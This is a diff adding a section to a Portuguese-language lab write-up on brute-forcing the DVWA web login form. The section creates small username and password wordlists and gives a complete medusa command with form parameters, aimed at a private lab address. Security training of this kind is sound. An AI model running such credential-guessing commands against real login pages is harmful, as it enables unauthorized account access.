@@ -73,3 +73,25 @@ Ao fim da execução é possível observar que o medusa obteve êxito utilizando
 5. Usar autenticação por chave sempre que possível.
 
 # Automação de tentativas em formulário web (DVWA)
+Para essa simulação iremos realizar um ataque de força bruta em um formulário de um sistema web, através do Damn Vulnerable Web Application (DVWA) e a ferramenta medusa. Precisaremos também, criar wordlists para automatizar o ataque, através do comando:
+
+Para usuários:
+
+    echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+
+E para senhas: 
+
+    echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+
+Agora utlizaremos o medusa para simular a combinação entre usuários e senhas, através do comando:
+
+     medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
+     -m PAGE:'/dvwa/login.php' \
+     -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+     -m 'FAIL=Login failed' -t 6
+
+Após a execução do comando, podemos verificar que o medusa obteve sucesso em algumas combinações de usuário e senha.
+<img width="1260" height="618" alt="image" src="https://github.com/user-attachments/assets/691018e4-63d2-4836-a537-b5be052f1bad" />
+
+# Password spraying em SMB com enumeração de usuários
+
